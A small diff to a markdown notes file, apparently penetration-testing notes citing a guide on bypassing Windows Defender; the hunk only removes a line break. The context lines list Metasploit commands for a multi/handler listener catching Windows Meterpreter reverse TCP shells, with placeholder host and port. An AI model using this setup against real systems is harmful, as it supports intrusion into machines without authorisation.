@@ -17,7 +17,7 @@ https://ired.team/offensive-security/defense-evasion/bypassing-windows-defender-
 - MSFCONSOLE<br>
     - use /exploit/multi/handler<br>
 	- set payload windows/meterpreter/reverse_tcp<br>
-	- set LHOST [IP]<br><br>
+	- set LHOST [IP]<br>
 	- set LPORT [Port]<br>
 	- set ExitOnSession false<br>
 	- exploit -j -z<br>
